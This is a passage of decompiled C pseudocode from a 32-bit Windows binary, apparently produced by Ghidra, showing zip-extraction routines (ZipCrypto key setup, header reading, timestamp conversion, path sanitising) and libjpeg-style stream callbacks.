  iVar4 = FUN_00406e70((uint *)&local_4);
  pcStack_8 = local_4;
  if (iVar4 == 0) {
    iVar4 = FUN_00406e70((uint *)&local_4);
    if (iVar4 == 0) {
      pcStack_8 = pcStack_8 + (int)local_4 * 0x100;
      goto LAB_00407ada;
    }
  }
  pcStack_8 = (char *)0x0;
  if (iVar4 != 0) {
    iVar6 = -1;
  }
LAB_00407ada:
  *param_2 = unaff_EDI[0x1e] + 0x1e + (int)pcVar5;
  *param_3 = pcStack_8;
  *param_1 = *param_1 + (int)pcStack_8;
  return iVar6;
}



undefined4 __cdecl FUN_00407b00(char *param_1)

{
  void **in_EAX;
  int iVar1;
  void **_Memory;
  void *pvVar2;
  uint *puVar3;
  uint *extraout_EDX;
  char *local_c;
  char *local_8;
  char *local_4;
  
  if ((in_EAX == (void **)0x0) || (in_EAX[6] == (void *)0x0)) {
    return 0xffffff9a;
  }
  if (in_EAX[0x1f] != (void *)0x0) {
    FUN_00407ee0();
  }
  iVar1 = FUN_00407870(&local_4,&local_c,&local_8);
  if (iVar1 != 0) {
    return 0xffffff99;
  }
  _Memory = (void **)_malloc(0x7e);
  if (_Memory != (void **)0x0) {
    pvVar2 = _malloc(0x4000);
    *_Memory = pvVar2;
    _Memory[0x11] = local_c;
    _Memory[0x12] = local_8;
    _Memory[0x13] = (void *)0x0;
    if (pvVar2 != (void *)0x0) {
      _Memory[0x10] = (void *)0x0;
      pvVar2 = in_EAX[0xd];
      _Memory[0x15] = in_EAX[0xf];
      _Memory[0x14] = (void *)0x0;
      _Memory[0x19] = in_EAX[0xd];
      _Memory[0x18] = *in_EAX;
      _Memory[0x1a] = in_EAX[3];
      _Memory[6] = (void *)0x0;
      if (pvVar2 != (void *)0x0) {
        _Memory[9] = (void *)0x0;
        _Memory[10] = (void *)0x0;
        _Memory[0xb] = (void *)0x0;
        iVar1 = FUN_004069c0();
        if (iVar1 == 0) {
          _Memory[0x10] = (void *)0x1;
        }
      }
      _Memory[0x16] = in_EAX[0x10];
      _Memory[0x17] = in_EAX[0x11];
      *(byte *)(_Memory + 0x1b) = *(byte *)(in_EAX + 0xc) & 1;
      if (((uint)in_EAX[0xc] >> 3 & 1) == 0) {
        *(undefined *)((int)_Memory + 0x7d) = *(undefined *)((int)in_EAX + 0x3f);
      }
      else {
        *(undefined *)((int)_Memory + 0x7d) = *(undefined *)((int)in_EAX + 0x39);
      }
      puVar3 = (uint *)((int)_Memory + 0x6d);
      *(uint *)((int)_Memory + 0x79) = -(uint)(*(char *)(_Memory + 0x1b) != '\0') & 0xc;
      *puVar3 = 0x12345678;
      *(undefined4 *)((int)_Memory + 0x71) = 0x23456789;
      *(undefined4 *)((int)_Memory + 0x75) = 0x34567890;
      if (param_1 != (char *)0x0) {
        do {
          if (*param_1 == '\0') break;
          FUN_004066b0(*param_1,puVar3);
          param_1 = param_1 + 1;
          puVar3 = extraout_EDX;
        } while (param_1 != (char *)0x0);
      }
      _Memory[0xf] = local_4 + (int)in_EAX[0x1e] + 0x1e;
      _Memory[2] = (void *)0x0;
      in_EAX[0x1f] = _Memory;
      return 0;
    }
    _free(_Memory);
  }
  return 0xffffff98;
}



int __thiscall FUN_00407c70(void *this,void *param_1,undefined *param_2)

{
  int *piVar1;
  char cVar2;
  void **ppvVar3;
  char *pcVar4;
  byte *pbVar5;
  undefined uVar6;
  int in_EAX;
  uint uVar7;
  void *pvVar8;
  void *pvVar9;
  int iVar10;
  int extraout_ECX;
  void *pvVar11;
  int local_c;
  int local_8;
  
  local_8 = 0;
  local_c = 0;
  if (param_2 != (undefined *)0x0) {
    *param_2 = 0;
  }
  if ((in_EAX == 0) || (ppvVar3 = *(void ***)(in_EAX + 0x7c), ppvVar3 == (void **)0x0)) {
    return -0x66;
  }
  if (*ppvVar3 == (void *)0x0) {
    return -100;
  }
  if (this != (void *)0x0) {
    ppvVar3[4] = param_1;
    ppvVar3[5] = this;
    if (ppvVar3[0x17] < this) {
      ppvVar3[5] = ppvVar3[0x17];
    }
    if (ppvVar3[5] != (void *)0x0) {
      do {
        if ((ppvVar3[2] == (void *)0x0) && (pvVar9 = ppvVar3[0x16], pvVar9 != (void *)0x0)) {
          pvVar8 = (void *)0x4000;
          if ((pvVar9 < (void *)0x4000) && (pvVar8 = pvVar9, pvVar9 == (void *)0x0)) {
            if (param_2 == (undefined *)0x0) {
              return 0;
            }
            *param_2 = 1;
            return 0;
          }
          pcVar4 = (char *)ppvVar3[0x18];
          iVar10 = (int)ppvVar3[0x1a] + (int)ppvVar3[0xf];
          if (*pcVar4 == '\0') {
            *(int *)(pcVar4 + 0x14) = iVar10;
          }
          else {
            if (pcVar4[1] == '\0') {
              return -1;
            }
            SetFilePointer(*(HANDLE *)(pcVar4 + 2),*(int *)(pcVar4 + 7) + iVar10,(PLONG)0x0,0);
            iVar10 = extraout_ECX;
          }
          uVar7 = FUN_00406e10(iVar10,*ppvVar3,1);
          if (uVar7 != 1) {
            return -1;
          }
          pvVar9 = *ppvVar3;
          ppvVar3[0xf] = (void *)((int)ppvVar3[0xf] + (int)pvVar8);
          ppvVar3[0x16] = (void *)((int)ppvVar3[0x16] - (int)pvVar8);
          ppvVar3[1] = pvVar9;
          ppvVar3[2] = pvVar8;
          if ((*(char *)(ppvVar3 + 0x1b) != '\0') && (pvVar11 = (void *)0x0, pvVar8 != (void *)0x0))
          {
            do {
              uVar6 = FUN_00406700();
              *(undefined *)((int)pvVar11 + (int)pvVar9) = uVar6;
              pvVar11 = (void *)((int)pvVar11 + 1);
            } while (pvVar11 < pvVar8);
          }
        }
        pvVar9 = ppvVar3[2];
        pvVar8 = *(void **)((int)ppvVar3 + 0x79);
        if (pvVar9 < *(void **)((int)ppvVar3 + 0x79)) {
          pvVar8 = pvVar9;
        }
        if (pvVar8 != (void *)0x0) {
          cVar2 = *(char *)((int)(void *)((int)ppvVar3[1] + (int)pvVar8) + -1);
          ppvVar3[0x17] = (void *)((int)ppvVar3[0x17] - (int)pvVar8);
          piVar1 = (int *)((int)ppvVar3 + 0x79);
          *piVar1 = *piVar1 - (int)pvVar8;
          ppvVar3[2] = (void *)((int)pvVar9 - (int)pvVar8);
          ppvVar3[1] = (void *)((int)ppvVar3[1] + (int)pvVar8);
          if ((*piVar1 == 0) && (cVar2 != *(char *)((int)ppvVar3 + 0x7d))) {
            return -0x6a;
          }
        }
        if (ppvVar3[0x19] == (void *)0x0) {
          pvVar9 = ppvVar3[2];
          if (ppvVar3[5] < ppvVar3[2]) {
            pvVar9 = ppvVar3[5];
          }
          pvVar8 = (void *)0x0;
          if (pvVar9 != (void *)0x0) {
            do {
              *(undefined *)((int)pvVar8 + (int)ppvVar3[4]) =
                   *(undefined *)((int)pvVar8 + (int)ppvVar3[1]);
              pvVar8 = (void *)((int)pvVar8 + 1);
            } while (pvVar8 < pvVar9);
          }
          pbVar5 = (byte *)ppvVar3[4];
          pvVar8 = (void *)FUN_004065a0(pbVar5,(uint)pvVar9);
          ppvVar3[0x17] = (void *)((int)ppvVar3[0x17] - (int)pvVar9);
          ppvVar3[2] = (void *)((int)ppvVar3[2] - (int)pvVar9);
          ppvVar3[5] = (void *)((int)ppvVar3[5] - (int)pvVar9);
          ppvVar3[1] = (void *)((int)ppvVar3[1] + (int)pvVar9);
          ppvVar3[6] = (void *)((int)ppvVar3[6] + (int)pvVar9);
          local_c = local_c + (int)pvVar9;
          ppvVar3[0x14] = pvVar8;
          ppvVar3[4] = pbVar5 + (int)pvVar9;
          if ((ppvVar3[0x17] == (void *)0x0) && (param_2 != (undefined *)0x0)) {
            *param_2 = 1;
          }
        }
        else {
          pbVar5 = (byte *)ppvVar3[4];
          pvVar9 = ppvVar3[6];
          local_8 = FUN_00406a70();
          uVar7 = (int)ppvVar3[6] - (int)pvVar9;
          pvVar9 = (void *)FUN_004065a0(pbVar5,uVar7);
          ppvVar3[0x17] = (void *)((int)ppvVar3[0x17] - uVar7);
          local_c = local_c + uVar7;
          ppvVar3[0x14] = pvVar9;
          if ((local_8 == 1) || (ppvVar3[0x17] == (void *)0x0)) {
            if (param_2 == (undefined *)0x0) {
              return local_c;
            }
            *param_2 = 1;
            return local_c;
          }
          if (local_8 != 0) {
            return local_8;
          }
        }
      } while (ppvVar3[5] != (void *)0x0);
      if (local_8 != 0) {
        return local_8;
      }
    }
    return local_c;
  }
  return 0;
}



undefined4 FUN_00407ee0(void)

{
  void **_Memory;
  undefined4 uVar1;
  int unaff_EDI;
  
  uVar1 = 0;
  if (unaff_EDI == 0) {
    return 0xffffff9a;
  }
  _Memory = *(void ***)(unaff_EDI + 0x7c);
  if (_Memory == (void **)0x0) {
    return 0xffffff9a;
  }
  if ((_Memory[0x17] == (void *)0x0) && (_Memory[0x14] != _Memory[0x15])) {
    uVar1 = 0xffffff97;
  }
  if (*_Memory != (void *)0x0) {
    _free(*_Memory);
    *_Memory = (void *)0x0;
  }
  *_Memory = (void *)0x0;
  if (_Memory[0x10] != (void *)0x0) {
    FUN_00406970();
  }
  _Memory[0x10] = (void *)0x0;
  _free(_Memory);
  *(undefined4 *)(unaff_EDI + 0x7c) = 0;
  return uVar1;
}



_FILETIME __fastcall FUN_00407f60(uint param_1)

{
  uint in_EAX;
  _FILETIME local_1c;
  SYSTEMTIME local_14;
  
  local_14.wYear = ((ushort)param_1 >> 9) + 0x7bc;
  local_14.wMonth = (ushort)(param_1 >> 5) & 0xf;
  local_14.wDay = (ushort)param_1 & 0x1f;
  local_14.wHour = (ushort)in_EAX >> 0xb;
  local_14.wMinute = (ushort)(in_EAX >> 5) & 0x3f;
  local_14.wSecond = ((ushort)in_EAX & 0x1f) * 2;
  local_14.wMilliseconds = 0;
  SystemTimeToFileTime(&local_14,&local_1c);
  return local_1c;
}



void FUN_00407fe0(void)

{
  char cVar1;
  char *pcVar2;
  char *pcVar3;
  undefined4 *unaff_ESI;
  
  unaff_ESI[1] = 0xffffffff;
  unaff_ESI[0x8e] = 0xffffffff;
  *unaff_ESI = 0;
  unaff_ESI[0x8f] = 0;
  unaff_ESI[0x90] = 0;
  pcVar2 = "";
  do {
    pcVar3 = pcVar2;
    pcVar2 = pcVar3 + 1;
  } while (*pcVar3 != '\0');
  pcVar2 = (char *)FUN_00410d7f((uint)(pcVar3 + -0x426bb9));
  unaff_ESI[0x8f] = pcVar2;
  pcVar3 = "";
  do {
    cVar1 = *pcVar3;
    *pcVar2 = cVar1;
    pcVar3 = pcVar3 + 1;
    pcVar2 = pcVar2 + 1;
  } while (cVar1 != '\0');
  return;
}



int FUN_00408040(undefined4 param_1,undefined4 param_2)

{
  short *psVar1;
  WCHAR WVar2;
  short sVar3;
  int **lpBuffer;
  undefined *puVar4;
  int *piVar5;
  int **unaff_ESI;
  undefined4 *puVar6;
  
  if ((*unaff_ESI == (int *)0x0) && (unaff_ESI[1] == (int *)0xffffffff)) {
    lpBuffer = unaff_ESI + 0x91;
    GetCurrentDirectoryW(0x104,(LPWSTR)lpBuffer);
    do {
      WVar2 = *(WCHAR *)lpBuffer;
      lpBuffer = (int **)((int)lpBuffer + 2);
    } while (WVar2 != L'\0');
    sVar3 = *(short *)((int)unaff_ESI + ((int)lpBuffer - ((int)unaff_ESI + 0x246) >> 1) * 2 + 0x242)
    ;
    if ((sVar3 != 0x5c) && (sVar3 != 0x2f)) {
      puVar6 = (undefined4 *)((int)unaff_ESI + 0x242);
      do {
        psVar1 = (short *)((int)puVar6 + 2);
        puVar6 = (undefined4 *)((int)puVar6 + 2);
      } while (*psVar1 != 0);
      *puVar6 = 0x5c;
    }
    puVar4 = (undefined *)operator_new(0x18);
    *puVar4 = 0;
    puVar4[1] = 1;
    puVar4[0xb] = 0;
    *(undefined4 *)(puVar4 + 0xc) = param_1;
    *(undefined4 *)(puVar4 + 0x10) = param_2;
    *(undefined4 *)(puVar4 + 0x14) = 0;
    *(undefined4 *)(puVar4 + 7) = 0;
    piVar5 = FUN_00407150();
    *unaff_ESI = piVar5;
    return (-(uint)(piVar5 != (int *)0x0) & 0xfffffe00) + 0x200;
  }
  return 0x1000000;
}



void __thiscall FUN_00408100(void *this,int param_1,int *param_2)

{
  wchar_t wVar1;
  char *pcVar2;
  int3 iVar3;
  _FILETIME _Var4;
  void *pvVar5;
  byte bVar6;
  int iVar7;
  char *pcVar8;
  wchar_t *pwVar9;
  undefined4 *puVar10;
  uint uVar11;
  byte bVar12;
  int iVar13;
  undefined4 extraout_ECX;
  byte *pbVar14;
  byte bVar15;
  byte bVar16;
  wchar_t *_Str;
  int *piVar17;
  int *piVar18;
  bool bVar19;
  longlong lVar20;
  undefined4 uStack_394;
  undefined auStack_390 [4];
  undefined4 local_38c;
  undefined4 local_388;
  void *local_384;
  int *piStack_380;
  _FILETIME _Stack_37c;
  _FILETIME _Stack_374;
  int local_36c;
  uint uStack_368;
  uint uStack_358;
  int iStack_350;
  int iStack_34c;
  uint uStack_334;
  undefined local_31c [4];
  CHAR aCStack_318 [264];
  WCHAR aWStack_210 [260];
  uint local_8;
  uint uStack_4;
  
  local_8 = DAT_0042b0a0 ^ (uint)&uStack_394;
  local_384 = this;
                    // WARNING: Load size is inaccurate
  if ((param_1 < -1) || (*(int *)(*this + 4) <= param_1)) goto LAB_0040869a;
  if (*(int *)((int)this + 4) != -1) {
    FUN_00407ee0();
  }
  _Var4.dwHighDateTime = _Stack_374.dwHighDateTime;
  _Var4.dwLowDateTime = _Stack_374.dwLowDateTime;
  *(undefined4 *)((int)this + 4) = 0xffffffff;
  if (param_1 == *(int *)((int)this + 0x238)) {
    if (param_1 != -1) {
      piVar17 = (int *)((int)this + 8);
      for (iVar13 = 0x8c; iVar13 != 0; iVar13 = iVar13 + -1) {
        *param_2 = *piVar17;
        piVar17 = piVar17 + 1;
        param_2 = param_2 + 1;
      }
      goto LAB_0040869a;
    }
  }
  else if (param_1 != -1) {
                    // WARNING: Load size is inaccurate
    if (param_1 < *(int *)(*this + 0x10)) {
      FUN_00407830();
    }
                    // WARNING: Load size is inaccurate
    iVar13 = *(int *)(*this + 0x10);
    while (iVar13 < param_1) {
                    // WARNING: Load size is inaccurate
      iVar13 = *this;
      if (((iVar13 != 0) && (*(int *)(iVar13 + 0x18) != 0)) &&
         (iVar7 = *(int *)(iVar13 + 0x10) + 1, iVar7 != *(int *)(iVar13 + 4))) {
        *(int *)(iVar13 + 0x14) =
             *(int *)(iVar13 + 0x14) +
             *(int *)(iVar13 + 0x50) + *(int *)(iVar13 + 0x4c) + 0x2e + *(int *)(iVar13 + 0x48);
        *(int *)(iVar13 + 0x10) = iVar7;
        iVar7 = FUN_004073e0((int *)(iVar13 + 0x28),(uint *)(iVar13 + 0x78),(void *)0x0,0);
        *(uint *)(iVar13 + 0x18) = (uint)(iVar7 == 0);
      }
                    // WARNING: Load size is inaccurate
      iVar13 = *(int *)(*this + 0x10);
    }
    FUN_004073e0(&local_36c,(uint *)0x0,local_31c,0x104);
    iVar13 = FUN_00407870((char **)&_Stack_374.dwHighDateTime,(char **)&local_388,
                          (char **)&local_38c);
    if (iVar13 != 0) goto LAB_0040869a;
                    // WARNING: Load size is inaccurate
    pcVar2 = **this;
    if (*pcVar2 == '\0') {
      *(char **)(pcVar2 + 0x14) = local_388;
LAB_004082a4:
      pcVar2 = local_38c;
      local_384 = (void *)FUN_00410d7f((uint)local_38c);
      pcVar8 = (char *)FUN_00406e10(extraout_ECX,local_384,(uint)pcVar2);
      if (pcVar8 == pcVar2) {
        *param_2 = *(int *)(*piStack_380 + 0x10);
        MultiByteToWideChar(0xfde9,0,aCStack_318,-1,aWStack_210,0x104);
        _Str = aWStack_210;
        while( true ) {
          while( true ) {
            while( true ) {
              while( true ) {
                while( true ) {
                  while( true ) {
                    for (; (wVar1 = *_Str, wVar1 != L'\0' && (_Str[1] == L':')); _Str = _Str + 2) {
                    }
                    if (wVar1 != L'\\') break;
                    _Str = _Str + 1;
                  }
                  if (wVar1 != L'/') break;
                  _Str = _Str + 1;
                }
                pwVar9 = _wcsstr(_Str,L"\\..\\");
                if (pwVar9 == (wchar_t *)0x0) break;
                _Str = pwVar9 + 4;
              }
              pwVar9 = _wcsstr(_Str,L"\\../");
              if (pwVar9 == (wchar_t *)0x0) break;
              _Str = pwVar9 + 4;
            }
            pwVar9 = _wcsstr(_Str,L"/../");
            if (pwVar9 == (wchar_t *)0x0) break;
            _Str = pwVar9 + 4;
          }
          pwVar9 = _wcsstr(_Str,L"/..\\");
          if (pwVar9 == (wchar_t *)0x0) break;
          _Str = pwVar9 + 4;
        }
        iVar13 = 4 - (int)_Str;
        do {
          wVar1 = *_Str;
          *(wchar_t *)((int)param_2 + iVar13 + (int)_Str) = wVar1;
          _Str = _Str + 1;
        } while (wVar1 != L'\0');
        bVar15 = ~(byte)(uStack_334 >> 0x17);
        uStack_368 = uStack_368 >> 8;
        bVar12 = (byte)(uStack_334 >> 0x1e);
        bVar6 = (byte)local_38c;
        local_38c._3_1_ = 0;
        bVar16 = local_38c._3_1_;
        local_38c = (char *)(uint)CONCAT12(1,(ushort)bVar6);
        pcVar2 = local_38c;
        if (((uStack_368 == 0) || (uStack_368 == 7)) || ((uStack_368 == 0xb || (uStack_368 == 0xe)))
           ) {
          bVar15 = (byte)uStack_334;
          local_38c = (char *)(CONCAT12(1,CONCAT11((char)(uStack_334 >> 2),bVar6)) & 0xffff01ff);
          bVar16 = (byte)(uStack_334 >> 1) & 1;
          bVar12 = (byte)(uStack_334 >> 4);
          bVar6 = (byte)(uStack_334 >> 5) & 1;
        }
        else {
          local_38c._2_1_ = 1;
          bVar6 = local_38c._2_1_;
          local_38c = pcVar2;
        }
        iVar13 = 0;
        param_2[0x83] = 0;
        if ((bVar12 & 1) != 0) {
          param_2[0x83] = 0x10;
        }
        if (bVar6 != 0) {
          param_2[0x83] = param_2[0x83] | 0x20;
        }
        if (bVar16 != 0) {
          param_2[0x83] = param_2[0x83] | 2;
        }
        if ((bVar15 & 1) != 0) {
          param_2[0x83] = param_2[0x83] | 1;
        }
        if (local_38c._1_1_ != '\0') {
          param_2[0x83] = param_2[0x83] | 4;
        }
        param_2[0x8a] = iStack_350;
        param_2[0x8b] = iStack_34c;
        _Stack_374 = FUN_00407f60(uStack_358 >> 0x10);
        LocalFileTimeToFileTime(&_Stack_374,&_Stack_37c);
        pvVar5 = local_384;
        pcVar2 = local_388;
        param_2[0x84] = _Stack_37c.dwLowDateTime;
        param_2[0x85] = _Stack_37c.dwHighDateTime;
        param_2[0x86] = _Stack_37c.dwLowDateTime;
        param_2[0x87] = _Stack_37c.dwHighDateTime;
        param_2[0x88] = _Stack_37c.dwLowDateTime;
        param_2[0x89] = _Stack_37c.dwHighDateTime;
        if ((char *)0x4 < local_388) {
          local_388 = (char *)((uint)local_388 & 0xff000000);
          do {
            local_388 = (char *)CONCAT31(CONCAT21(local_388._2_2_,
                                                  *(undefined *)((int)local_384 + iVar13 + 1)),
                                         *(undefined *)(iVar13 + (int)local_384));
            pbVar14 = &DAT_00428d7c;
            puVar10 = &local_388;
            do {
              bVar15 = *(byte *)puVar10;
              bVar19 = bVar15 < *pbVar14;
              if (bVar15 != *pbVar14) {
LAB_00408530:
                iVar7 = (1 - (uint)bVar19) - (uint)(bVar19 != 0);
                goto LAB_00408535;
              }
              if (bVar15 == 0) break;
              bVar15 = *(byte *)((int)puVar10 + 1);
              bVar19 = bVar15 < pbVar14[1];
              if (bVar15 != pbVar14[1]) goto LAB_00408530;
              puVar10 = (undefined4 *)((int)puVar10 + 2);
              pbVar14 = pbVar14 + 2;
            } while (bVar15 != 0);
            iVar7 = 0;
LAB_00408535:
            if (iVar7 == 0) {
              bVar15 = *(byte *)(iVar13 + 4 + (int)local_384);
              iVar7 = iVar13 + 5;
              local_38c = (char *)(CONCAT22(local_38c._2_2_,
                                            CONCAT11(bVar15 >> 2,(undefined)local_38c)) & 0xffff01ff
                                  );
              bVar6 = bVar15 >> 2 & 1;
              if ((bVar15 & 1) != 0) {
                iVar3 = CONCAT21(CONCAT11(*(undefined *)(iVar13 + 8 + (int)local_384),
                                          *(undefined *)(iVar13 + 7 + (int)local_384)),
                                 *(undefined *)(iVar13 + 6 + (int)local_384));
                uVar11 = CONCAT31(iVar3,*(undefined *)(iVar7 + (int)local_384));
                iVar7 = iVar13 + 9;
                lVar20 = __allmul(uVar11 + 0xb6109100,
                                  ((int)iVar3 >> 0x17) + 2 + (uint)(0x49ef6eff < uVar11),10000000,0)
                ;
                *(longlong *)(param_2 + 0x88) = lVar20;
                bVar6 = local_38c._1_1_;
              }
              if ((bVar15 >> 1 & 1) != 0) {
                iVar3 = CONCAT21(CONCAT11(*(undefined *)(iVar7 + 3 + (int)pvVar5),
                                          *(undefined *)(iVar7 + 2 + (int)pvVar5)),
                                 *(undefined *)(iVar7 + 1 + (int)pvVar5));
                uVar11 = CONCAT31(iVar3,*(undefined *)(iVar7 + (int)pvVar5));
                iVar7 = iVar7 + 4;
                lVar20 = __allmul(uVar11 + 0xb6109100,
                                  ((int)iVar3 >> 0x17) + 2 + (uint)(0x49ef6eff < uVar11),10000000,0)
                ;
                *(longlong *)(param_2 + 0x84) = lVar20;
                bVar6 = local_38c._1_1_;
              }
              if (bVar6 != 0) {
                iVar3 = CONCAT21(CONCAT11(*(undefined *)(iVar7 + 3 + (int)pvVar5),
                                          *(undefined *)(iVar7 + 2 + (int)pvVar5)),
                                 *(undefined *)(iVar7 + 1 + (int)pvVar5));
                uVar11 = CONCAT31(iVar3,*(undefined *)(iVar7 + (int)pvVar5));
                lVar20 = __allmul(uVar11 + 0xb6109100,
                                  ((int)iVar3 >> 0x17) + 2 + (uint)(0x49ef6eff < uVar11),10000000,0)
                ;
                *(longlong *)(param_2 + 0x86) = lVar20;
              }
              break;
            }
            iVar13 = iVar13 + 4 + (uint)*(byte *)(iVar13 + 2 + (int)local_384);
          } while ((char *)(iVar13 + 4U) < pcVar2);
        }
        if (pvVar5 != (void *)0x0) {
          FUN_00410ddb(pvVar5);
        }
        piVar17 = param_2;
        piVar18 = piStack_380 + 2;
        for (iVar13 = 0x8c; iVar13 != 0; iVar13 = iVar13 + -1) {
          *piVar18 = *piVar17;
          piVar17 = piVar17 + 1;
          piVar18 = piVar18 + 1;
        }
        piStack_380[0x8e] = (int)param_2;
        goto LAB_0040869a;
      }
      FUN_00410ddb(local_384);
    }
    else if (pcVar2[1] != '\0') {
      SetFilePointer(*(HANDLE *)(pcVar2 + 2),(LONG)(local_388 + *(int *)(pcVar2 + 7)),(PLONG)0x0,0);
      goto LAB_004082a4;
    }
    goto LAB_0040869a;
  }
                    // WARNING: Load size is inaccurate
  *param_2 = *(int *)(*this + 4);
  *(undefined2 *)(param_2 + 1) = 0;
  param_2[0x83] = 0;
  param_2[0x84] = 0;
  param_2[0x85] = 0;
  param_2[0x86] = 0;
  param_2[0x87] = 0;
  param_2[0x88] = 0;
  param_2[0x89] = 0;
  param_2[0x8a] = 0;
  param_2[0x8b] = 0;
  _Stack_374 = _Var4;
LAB_0040869a:
  uStack_394 = 0x4086ac;
  ___security_check_cookie_4(uStack_4 ^ (uint)auStack_390);
  return;
}



void FUN_004086c0(void *param_1,void *param_2)

{
  int iVar1;
  int iVar2;
  int *unaff_EBX;
  undefined auStack_8 [3];
  char local_5;
  uint local_4;
  
  local_4 = DAT_0042b0a0 ^ (uint)auStack_8;
  if (unaff_EBX[1] != 0) {
    if (unaff_EBX[1] != -1) {
      FUN_00407ee0();
    }
    unaff_EBX[1] = -1;
    if (*(int *)(*unaff_EBX + 4) < 1) {
      ___security_check_cookie_4(local_4 ^ (uint)auStack_8);
      return;
    }
    if (0 < *(int *)(*unaff_EBX + 0x10)) {
      FUN_00407830();
    }
    iVar2 = *(int *)(*unaff_EBX + 0x10);
    while (iVar2 < 0) {
      iVar2 = *unaff_EBX;
      if (((iVar2 != 0) && (*(int *)(iVar2 + 0x18) != 0)) &&
         (iVar1 = *(int *)(iVar2 + 0x10) + 1, iVar1 != *(int *)(iVar2 + 4))) {
        *(int *)(iVar2 + 0x14) =
             *(int *)(iVar2 + 0x14) +
             *(int *)(iVar2 + 0x50) + *(int *)(iVar2 + 0x4c) + 0x2e + *(int *)(iVar2 + 0x48);
        *(int *)(iVar2 + 0x10) = iVar1;
        iVar1 = FUN_004073e0((int *)(iVar2 + 0x28),(uint *)(iVar2 + 0x78),(void *)0x0,0);
        *(uint *)(iVar2 + 0x18) = (uint)(iVar1 == 0);
      }
      iVar2 = *(int *)(*unaff_EBX + 0x10);
    }
    FUN_00407b00((char *)unaff_EBX[0x8f]);
    unaff_EBX[1] = 0;
  }
  iVar2 = FUN_00407c70(param_2,param_1,&local_5);
  if (iVar2 < 1) {
    FUN_00407ee0();
    unaff_EBX[1] = -1;
  }
  if (local_5 == '\0') {
    if (iVar2 < 1) {
      ___security_check_cookie_4(local_4 ^ (uint)auStack_8);
      return;
    }
    ___security_check_cookie_4(local_4 ^ (uint)auStack_8);
    return;
  }
  ___security_check_cookie_4(local_4 ^ (uint)auStack_8);
  return;
}



void FUN_00408820(void)

{
  void **_Memory;
  void *pvVar1;
  void **unaff_ESI;
  
  if (unaff_ESI[1] != (void *)0xffffffff) {
    FUN_00407ee0();
  }
  _Memory = (void **)*unaff_ESI;
  unaff_ESI[1] = (void *)0xffffffff;
  if (_Memory != (void **)0x0) {
    if (_Memory[0x1f] != (void *)0x0) {
      FUN_00407ee0();
    }
    pvVar1 = *_Memory;
    if (pvVar1 != (void *)0x0) {
      if (*(char *)((int)pvVar1 + 0xb) != '\0') {
        CloseHandle(*(HANDLE *)((int)pvVar1 + 2));
      }
      FUN_0040fb79(pvVar1);
    }
    _free(_Memory);
  }
  *unaff_ESI = (void *)0x0;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 * __cdecl FUN_00408880(undefined4 param_1,undefined4 param_2)

{
  void *pvVar1;
  int iVar2;
  undefined4 *puVar3;
  void *local_c;
  undefined *puStack_8;
  undefined4 local_4;
  
  local_4 = 0xffffffff;
  puStack_8 = &LAB_00421ebb;
  local_c = ExceptionList;
  ExceptionList = &local_c;
  pvVar1 = operator_new(0x44c);
  local_4 = 0;
  if (pvVar1 == (void *)0x0) {
    iVar2 = 0;
  }
  else {
    iVar2 = FUN_00407fe0();
  }
  local_4 = 0xffffffff;
  _DAT_0044e28c = FUN_00408040(param_1,param_2);
  if (_DAT_0044e28c != 0) {
    if (iVar2 != 0) {
      FUN_00408930();
    }
    ExceptionList = local_c;
    return (undefined4 *)0x0;
  }
  puVar3 = (undefined4 *)operator_new(8);
  *puVar3 = 1;
  puVar3[1] = iVar2;
  ExceptionList = local_c;
  return puVar3;
}



void FUN_00408930(void)

{
  void *unaff_ESI;
  
  if (*(void **)((int)unaff_ESI + 0x23c) != (void *)0x0) {
    FUN_00410ddb(*(void **)((int)unaff_ESI + 0x23c));
  }
  *(undefined4 *)((int)unaff_ESI + 0x23c) = 0;
  if (*(void **)((int)unaff_ESI + 0x240) != (void *)0x0) {
    FUN_00410ddb(*(void **)((int)unaff_ESI + 0x240));
  }
  *(undefined4 *)((int)unaff_ESI + 0x240) = 0;
  FUN_0040fb79(unaff_ESI);
  return;
}



void __fastcall FUN_00408976(int param_1)

{
  FUN_0040fb79(*(void **)(param_1 + 0x34));
  return;
}



undefined4 __cdecl FUN_00408994(int *param_1)

{
  undefined4 *puVar1;
  int iVar2;
  
  puVar1 = (undefined4 *)param_1[6];
  iVar2 = (**(code **)(*(int *)puVar1[0xc] + 0xc))(puVar1[0xd],1,0x1000);
  if (iVar2 != 0x1000) {
    *(undefined4 *)(*param_1 + 0x14) = 0x25;
    (**(code **)*param_1)(param_1);
  }
  puVar1[1] = 0x1000;
  *puVar1 = puVar1[0xd];
  return CONCAT31((int3)((uint)puVar1[0xd] >> 8),1);
}



void __cdecl FUN_004089d2(int *param_1)

{
  int iVar1;
  int iVar2;
  
  iVar2 = param_1[6];
  iVar1 = 0x1000 - *(int *)(iVar2 + 4);
  if (iVar1 != 0) {
    iVar1 = (**(code **)(**(int **)(iVar2 + 0x30) + 0xc))(*(undefined4 *)(iVar2 + 0x34),1,iVar1);
    if (iVar1 == 0) {
      *(undefined4 *)(*param_1 + 0x14) = 0x25;
      (**(code **)*param_1)(param_1);
    }
  }
  (**(code **)(**(int **)(iVar2 + 0x30) + 0x1c))();
  iVar2 = (**(code **)(**(int **)(iVar2 + 0x30) + 0x24))();
  if (iVar2 != 0) {
    *(undefined4 *)(*param_1 + 0x14) = 0x25;
    (**(code **)*param_1)(param_1);
  }
  return;
}



undefined4 __cdecl FUN_00408a40(int *param_1)

{
  int iVar1;
  int iVar2;
  
  if (param_1[6] == 0) {
    iVar2 = 0;
  }
  else {
    iVar2 = param_1[6] + -0x14;
  }
  iVar1 = (**(code **)(**(int **)(iVar2 + 0x30) + 8))(*(undefined4 *)(iVar2 + 0x34),1,0x1000);
  if (iVar1 == 0) {
    if (*(char *)(iVar2 + 0x38) != '\0') {
      *(undefined4 *)(*param_1 + 0x14) = 0x2a;
      (**(code **)*param_1)(param_1);
    }
    *(undefined4 *)(*param_1 + 0x14) = 0x78;
    (**(code **)(*param_1 + 4))(param_1,0xffffffff);
    **(undefined **)(iVar2 + 0x34) = 0xff;
    *(undefined *)(*(int *)(iVar2 + 0x34) + 1) = 0xd9;
    iVar1 = 2;
  }
  *(int *)(iVar2 + 0x18) = iVar1;
  *(undefined4 *)(iVar2 + 0x14) = *(undefined4 *)(iVar2 + 0x34);
  *(undefined *)(iVar2 + 0x38) = 0;
  return CONCAT31((int3)((uint)iVar1 >> 8),1);
}



void __cdecl FUN_00408ab4(int *param_1,int param_2)

{
  int iVar1;
  int iVar2;
  
  if (param_1[6] == 0) {
    iVar2 = 0;
  }
  else {
    iVar2 = param_1[6] + -0x14;
